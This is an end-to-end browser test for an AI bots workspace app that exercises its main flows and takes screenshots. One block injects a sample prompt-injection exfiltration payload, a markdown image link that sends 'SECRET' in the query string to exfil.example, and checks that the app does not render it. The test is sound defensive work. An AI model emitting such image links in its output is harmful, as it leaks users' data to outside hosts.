/**
 * End-to-end UI check: boots the app in demo mode (scripted engine, dev sign-in) on a temp state
 * directory, drives Chromium through the main flows, saves screenshots, and fails on any browser
 * console error or failed assertion.
 *
 *   npm run e2e                 # screenshots land in ./screenshots
 *   E2E_HEADED=1 npm run e2e    # watch it
 */
import { existsSync } from "node:fs";
import { mkdtemp, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import type { AddressInfo } from "node:net";
import { chromium, type Page } from "playwright-core";
import { buildApp } from "../src/app.js";
import { loadConfig } from "../src/config.js";
import { DemoEngine } from "../src/engine/demo.js";

const root = path.join(import.meta.dirname, "..");
const shots = path.resolve(process.env.E2E_SCREENSHOTS ?? path.join(root, "screenshots"));
await mkdir(shots, { recursive: true });
const state = await mkdtemp(path.join(tmpdir(), "bots-e2e-"));

const config = loadConfig({ ...process.env, ENGINE: "demo", DEV_LOGIN: "1", COMPUTER_ACCESS: "shell", STATE_DIR: state, ADMINS: "alice", WORKSPACE_DIR: path.join(root, "workspace"), ORG_NAME: "Acme" });
const app = await buildApp(config, { engine: new DemoEngine(8) });
await new Promise<void>((r) => app.server.listen(0, "127.0.0.1", r));
const base = `http://127.0.0.1:${(app.server.address() as AddressInfo).port}`;

// CHROMIUM_PATH, else the preinstalled browser, else Playwright's own (`npx playwright-core install chromium`).
const executablePath = process.env.CHROMIUM_PATH ?? (existsSync("/opt/pw-browsers/chromium") ? "/opt/pw-browsers/chromium" : undefined);
const browser = await chromium.launch({ executablePath, headless: !process.env.E2E_HEADED });
const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, colorScheme: "dark" });
const page = await context.newPage();
const errors: string[] = [];
const remoteRequests: string[] = [];
context.on("request", (r) => {
    if (!r.url().startsWith(base) && !r.url().startsWith("data:") && !r.url().startsWith("blob:")) remoteRequests.push(r.url());
});
page.on("console", (m) => m.type() === "error" && errors.push(`console: ${m.text()}`));
page.on("pageerror", (e) => errors.push(`pageerror: ${e.message}`));

let step = 0;
const shot = async (name: string, p: Page = page) => {
    step += 1;
    await p.waitForTimeout(250);
    await p.evaluate(() => document.querySelectorAll(".toast").forEach((t) => t.remove()));
    await p.screenshot({ path: path.join(shots, `${String(step).padStart(2, "0")}-${name}.png`) });
    console.log(`  ✓ ${name}`);
};
const send = async (text: string) => {
    await page.locator(".composer textarea").fill(text);
    await page.keyboard.press("Enter");
};
const waitForBotMessages = (n: number) => page.waitForFunction((count) => document.querySelectorAll(".msg.bot:not(:has(.cursor))").length >= count, n, { timeout: 15_000 });
const createFromTemplate = async (label: string) => {
    await page.getByRole("button", { name: "New bot" }).first().click();
    await page.locator(".template-strip").getByRole("button", { name: label, exact: true }).click();
    await page.getByRole("button", { name: "Create bot" }).click();
    await page.waitForSelector(".composer textarea");
};

try {
    await page.goto(base);
    await page.waitForSelector(".login");
    await shot("login");
    await page.getByRole("button", { name: "Enter demo" }).click();
    await page.waitForSelector(".sidebar");
    // Trusted Types are enforced: raw strings can't reach an HTML sink, only DOMPurify output can.
    // The probe's own violation report is expected, so it is dropped from the error list.
    const before = errors.length;
    const ttEnforced = await page.evaluate(() => {
        try {
            document.createElement("div").innerHTML = "<b>raw</b>";
            return false;
        } catch {
            return true;
        }
    });
    await page.waitForTimeout(100);
    errors.length = before;
    if (!ttEnforced) errors.push("Trusted Types are not enforced");
    await shot("home");

    // Create bots from role templates
    await page.getByRole("button", { name: "New bot" }).first().click();
    await page.locator(".template-strip").getByRole("button", { name: "Chief of Staff", exact: true }).click();
    await shot("new-bot-template");
    await page.getByRole("button", { name: "Create bot" }).click();
    await page.waitForSelector(".welcome");
    await shot("dm-welcome");
    await createFromTemplate("Researcher");
    await createFromTemplate("Data Analyst");

    // Delegation + memory from the Chief of Staff
    await page.locator(".roster-item", { hasText: "Atlas" }).click();
    await send("Please delegate a quick competitive analysis of AI coding agents, and remember that I like bullet points.");
    await page.waitForSelector(".msg.bot .task-result", { timeout: 20_000 });
    await waitForBotMessages(2);
    await page.locator(".msg.bot .activity summary").first().click();
    await shot("delegation-and-task-result");

    // Approval flow on the computer bot
    await page.locator(".roster-item", { hasText: "Metric" }).click();
    await send("Run a script that writes a file on your computer.");
    await page.waitForSelector(".approval.pending", { timeout: 15_000 });
    await shot("approval-requested");
    await page.locator(".approval.pending").getByRole("button", { name: "Approve" }).click();
    await waitForBotMessages(1);
    await shot("approval-approved");

    // Routine via chat
    await send("Set up a routine every weekday morning to summarize new files.");
    await waitForBotMessages(2);

    // Group chat with hand-off
    await page.getByRole("button", { name: "New group chat" }).click();
    await page.locator(".modal input.input").fill("Launch squad");
    for (const n of ["Atlas", "Scout"]) await page.locator(".modal .checks label", { hasText: n }).click();
    await page.getByRole("button", { name: "Create", exact: true }).click();
    await page.waitForSelector(".welcome");
    await page.locator(".composer textarea").fill("@");
    await page.waitForSelector(".mention-menu:not([hidden])");
    await shot("group-mention-menu");
    await page.keyboard.press("Enter"); // picks the first suggestion
    await page.keyboard.type("plan the launch as a team handoff");
    await page.keyboard.press("Enter");
    await waitForBotMessages(2); // the lead replies, then hands off to the teammate it mentioned
    await shot("group-chat");

    // Profile panel
    await page.getByRole("button", { name: "Bot profile" }).click();
    await page.waitForSelector(".profile .hero");
    await shot("profile-panel");
    // Sidebar organization: file the lead bot under a section
    const sectionInput = page.locator(".profile input[list=section-names]");
    await sectionInput.fill("Leadership");
    await sectionInput.press("Enter");
    await sectionInput.blur();
    await page.waitForSelector(".sidebar .section-head:has-text('Leadership')");
    await page.getByRole("button", { name: "Close profile" }).click();
    await shot("sidebar-sections");

    // Bot output can't make the browser load remote images (prompt-injection exfiltration)
    const groupId = new URL(page.url()).hash.split("/")[2]!;
    const repo = app.runtime.repo;
    const exfil = repo.addMessage(groupId, "bot", repo.threads("alice", { kind: ["group"] })[0]!.botIds[0]!, "Report ready ![chart](https://exfil.example/c.png?d=SECRET)");
    app.runtime.hub.publish("alice", { type: "message.created", message: exfil });
    await page.waitForSelector(`[data-id="${exfil.id}"] a[href^="https://exfil.example"]`);
    if (await page.locator(`[data-id="${exfil.id}"] img`).count()) errors.push("remote image rendered as <img>");

    // Teach a skill from the thread
    await page.locator(".roster-item", { hasText: "Atlas" }).click();
    await page.getByRole("button", { name: "Teach a skill from this thread" }).click();
    await page.waitForSelector(".modal textarea.mono", { timeout: 15_000 }).catch(() => undefined);
    if (await page.locator(".modal textarea.mono").count()) {
        await shot("skill-draft");
        await page.getByRole("button", { name: "Cancel" }).click();
    }

    // Engineering integrations: a webhook starts a routine, results post to a channel
    await page.goto(`${base}/#/routines`);
    await page.waitForSelector(".page-inner .card");
    const routineCard = page.locator(".page-inner .card").first();
    await routineCard.locator(".switch").click(); // bots propose routines switched off
    await page.waitForSelector(".page-inner .card:not(:has-text('Off · review'))");
    await page.locator(".page-inner .card").first().getByRole("button", { name: "Triggers & delivery" }).click();
    await page.locator(".modal .switch").first().click();
    await page.waitForSelector(".modal .secret-box");
    const hookUrl = await page.locator(".modal .secret-row input").first().inputValue();
    const hookSecret = await page.locator(".modal .secret-box input").inputValue();
    await page.locator(".modal .chip", { hasText: "CI failed" }).click();
    await page.getByRole("button", { name: "Save filters" }).click();
    await shot("routine-webhook");
    await page.getByRole("button", { name: "Done" }).click();
    const delivered = await fetch(hookUrl, {
        method: "POST",
        headers: { Authorization: `Bearer ${hookSecret}`, "X-Event-Type": "workflow_run.completed" },
        body: JSON.stringify({ action: "completed", workflow_run: { name: "CI", conclusion: "failure", html_url: "https://github.com/acme/api/actions/runs/1" }, repository: { full_name: "acme/api" } }),
    });
    if (delivered.status !== 202) errors.push(`webhook delivery returned ${delivered.status}`);
    await page.waitForSelector(".list-row:has-text('workflow_run.completed acme/api')", { timeout: 15_000 });
    await shot("routine-webhook-run");

    // API token for CI, and the one-shot ask endpoint it unlocks
    await page.goto(`${base}/#/settings`);
    await page.locator("input[placeholder='e.g. CI on api-gateway']").fill("CI on api-gateway");
    await page.getByRole("button", { name: "Create token" }).click();
    await page.waitForSelector(".secret-box");
    const apiToken = await page.locator(".secret-box input").inputValue();
    await page.locator(".secret-box").scrollIntoViewIfNeeded();
    await shot("api-token");
    const ask = await fetch(`${base}/api/bots/concierge/ask`, { method: "POST", headers: { Authorization: `Bearer ${apiToken}`, "Content-Type": "application/json" }, body: JSON.stringify({ prompt: "Summarize this diff", input: "+ retry()" }) });
    const answer = (await ask.json()) as { status?: string };
    if (ask.status !== 200 || answer.status !== "done") errors.push(`ask API returned ${ask.status} ${JSON.stringify(answer)}`);

    // Illustrative history for the usage screenshots: a month of a small team's activity.
    const people = ["alice", "bob", "carol", "dmitri"];
    const botIds = app.runtime.directory.bots({ login: "alice", orgs: ["demo"] }).map((e) => e.bot.id);
    for (let d = 29; d >= 1; d--) {
        const day = new Date(Date.now() - d * 86400_000).toISOString().slice(0, 10);
        const weekday = ![0, 6].includes(new Date(`${day}T12:00:00Z`).getUTCDay());
        people.forEach((login, i) => {
            const turns = weekday ? 3 + ((d * 7 + i * 5) % 9) : (d + i) % 2;
            for (let t = 0; t < turns; t++) {
                const [source, model] = ([["chat", "gpt-5"], ["task", "claude-sonnet-4.5"], ["routine", "gpt-5"], ["api", "gpt-5-mini"]] as const)[(t + i) % 4]!;
                const bot = botIds[(t * 3 + i + d) % botIds.length]!;
                app.runtime.repo.db.run(
                    "INSERT INTO usage (owner, bot_id, source, model, calls, input_tokens, output_tokens, premium_requests, tool_calls, duration_ms, ok, day, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    login, bot, source, model, 2, 4000 + t * 900, 600 + t * 80, model === "gpt-5-mini" ? 0 : 1, t % 3, 9000, (d + t) % 23 === 0 ? 0 : 1, day, `${day}T10:00:00.000Z`,
                );
            }
        });
    }

    for (const [hash, name] of [["#/inbox", "inbox"], ["#/tasks", "tasks"], ["#/routines", "routines"], ["#/skills", "skills"], ["#/connectors", "connectors"], ["#/computer", "computer"], ["#/settings", "settings-memory"], ["#/admin", "admin-usage"], ["#/", "home-team"]] as const) {
        await page.goto(`${base}/${hash}`);
        await page.waitForSelector(".page-inner");
        await shot(name);
    }

    await page.goto(`${base}/#/admin`);
    await page.getByRole("tab", { name: "Audit log" }).click();
    await page.waitForSelector(".list-row .tag");
    await shot("audit-log");
    await page.goto(`${base}/#/`);
    await page.waitForSelector(".page-inner");

    // Search palette
    await page.keyboard.press("Control+k");
    await page.locator(".palette input").fill("analysis");
    await page.waitForTimeout(400);
    await shot("search-palette");
    await page.keyboard.press("Escape");

    // Share link, opened logged-out
    await page.locator(".roster-item", { hasText: "Atlas" }).click();
    await page.getByRole("button", { name: "Share link" }).click();
    const url = await page.locator(".modal input.input").inputValue();
    const anon = await browser.newPage({ viewport: { width: 1100, height: 800 }, colorScheme: "dark" });
    await anon.goto(url);
    await anon.waitForSelector(".share-page .msg");
    await shot("shared-thread", anon);
    await anon.close();
    await page.keyboard.press("Escape");

    // Light theme + mobile
    await page.getByRole("button", { name: "Toggle theme" }).click();
    await shot("light-theme");
    await page.setViewportSize({ width: 390, height: 844 });
    await page.waitForTimeout(200);
    await shot("mobile-thread");
    await page.getByRole("button", { name: "Menu" }).click();
    await shot("mobile-nav");

    const overflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth + 1);
    if (overflow) errors.push("horizontal overflow at 390px");

    // Delete my data, last: it signs the user out
    await page.setViewportSize({ width: 1440, height: 900 });
    await page.goto(`${base}/#/settings`);
    await page.getByRole("button", { name: "Delete all my data" }).click();
    await page.getByRole("button", { name: "Delete everything" }).click();
    await page.waitForSelector(".login");
    if (app.runtime.repo.threads("alice", { includeArchived: true }).length) errors.push("threads survived delete-my-data");
    if (remoteRequests.length) errors.push(`browser made remote requests: ${remoteRequests.join(", ")}`);
} catch (err) {
    errors.push(`flow: ${(err as Error).stack ?? err}`);
    await page.screenshot({ path: path.join(shots, "failure.png") }).catch(() => {});
} finally {
    await browser.close();
    await app.shutdown();
}

if (errors.length) {
    console.error(`\n${errors.length} problem(s):\n${errors.join("\n")}`);
    process.exit(1);
}
console.log(`\nAll good. Screenshots in ${shots}`);
